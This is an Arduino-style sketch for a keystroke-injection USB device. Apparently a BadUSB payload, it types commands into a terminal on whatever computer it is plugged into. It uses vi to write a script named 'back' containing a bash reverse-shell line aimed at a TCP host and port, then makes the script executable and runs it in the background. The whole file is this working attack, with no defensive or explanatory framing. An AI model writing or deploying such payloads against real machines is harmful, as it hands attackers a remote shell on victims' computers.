#include <kb.h>

void setup()
{
  kb_init();
  GUI;
  DELAY;
  printKey("terminal");
  DELAY;
  writeKey(KB_ENTER, 0, 0);
  DELAY;
  printKey("vi back");
  DELAY;
  writeKey(KB_ENTER, 0, 0);
  DELAY;
  printKey("i");
  DELAY;
  writeKey(KB_ENTER, 0, 0);
  DELAY;
  printKey("#!/bin/bash");
  DELAY;
  writeKey(KB_ENTER, 0, 0);
  DELAY;
  printKey("bash -i >& /dev/tcp/127.0.0.1/1234 0>&1");
  DELAY;
  writeKey(KB_ESCAPE, 0, 0);
  DELAY;
  printKey(":wq");
  DELAY;
  writeKey(KB_ENTER, 0, 0);
  DELAY;
  printKey("chmod +x back");
  DELAY;
  writeKey(KB_ENTER, 0, 0);
  DELAY;
  printKey("./back &");
  DELAY;
  writeKey(KB_ENTER, 0, 0);
}

void loop()
{

}
